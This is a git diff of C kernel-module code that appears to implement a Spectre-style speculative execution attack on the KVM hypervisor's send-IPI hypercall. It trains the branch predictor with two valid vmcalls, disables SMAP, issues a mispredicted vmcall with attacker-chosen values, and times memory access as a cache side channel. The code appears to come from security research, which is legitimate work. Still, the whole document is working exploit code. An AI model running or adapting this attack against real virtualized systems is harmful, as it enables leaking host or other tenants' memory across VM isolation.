@@ -20,7 +20,7 @@ static inline __attribute__((always_inline)) void disable_smap(void) { __asm__ v
 static inline __attribute__((always_inline)) void enable_smap(void) { __asm__ volatile("clac" ::: "cc"); }
 
 static inline __attribute__((always_inline)) void confuse_branch_predictor(void) {
-  // Confuse the branch predictor
+  // Bring the branch predictor into a known state of history
   asm volatile("movq $0, %%rcx\n"
                "cmpq $0, %%rcx\n"
                ".rept 300\n" // TODO: optimize this, maybe 300 is too much/too little?
@@ -28,6 +28,12 @@ static inline __attribute__((always_inline)) void confuse_branch_predictor(void)
                "1:\n"
                ".endr\n" ::
                    : "rcx", "cc");
+}
+
+static noinline void vmcall(int hypercall_number, unsigned long rbx, unsigned long rcx, unsigned long rdx,
+                            unsigned long rsi) {
+  confuse_branch_predictor();
+  asm volatile("vmcall" : "+a"(hypercall_number), "+b"(rbx), "+c"(rcx), "+d"(rdx), "+S"(rsi));
 }
 
 static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
@@ -43,24 +49,26 @@ static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t
     return -EFAULT;
   }
 
-  confuse_branch_predictor();
-
   int type = KVM_HC_SEND_IPI;
 
-  // Do the vmcall once with valid values
-  asm volatile("vmcall"
-               : "+a"(type), "+b"(opts.real.mask_low), "+c"(opts.real.mask_low), "+d"(opts.real.min),
-                 "+S"(opts.real.icr.raw_icr));
+  // Take the correct branch twice, so the 2-bit saturating counter from the branch predictor
+  // will be at least in the weakly taken/strongly taken state
+  //
+  //                    taken           taken        taken
+  //       ┌─►┌─────────┬────►┌─────────┬────►┌──────┬────►┌────────┬──┐
+  //   not │  │strongly │     │ weakly  │     │weakly│     │strongly│  │taken
+  //  taken│  │not taken│     │not taken│     │taken │     │ taken  │  │
+  //       └──┴─────────┘◄────┴─────────┘◄────┴──────┘◄────┴────────┘◄─┘
+  //                      not             not          not
+  //                     taken           taken        taken
+  //
+  vmcall(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
+  vmcall(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
 
-  confuse_branch_predictor();
+  // Do the mispredicted vmcall!
   disable_smap();
-
-  // Do the vmcall, this time with the mispredicted buffer
-  type = KVM_HC_SEND_IPI;
-  asm volatile("vmcall"
-               : "+a"(type), "+b"(opts.mispredicted.mask_low), "+c"(opts.mispredicted.mask_low),
-                 "+d"(opts.mispredicted.min), "+S"(opts.mispredicted.icr.raw_icr));
-
+  vmcall(type, opts.mispredicted.mask_low, opts.mispredicted.mask_high, opts.mispredicted.min,
+         opts.mispredicted.icr.raw_icr);
   size_t time = access_time(opts.ptr);
   enable_smap();
 
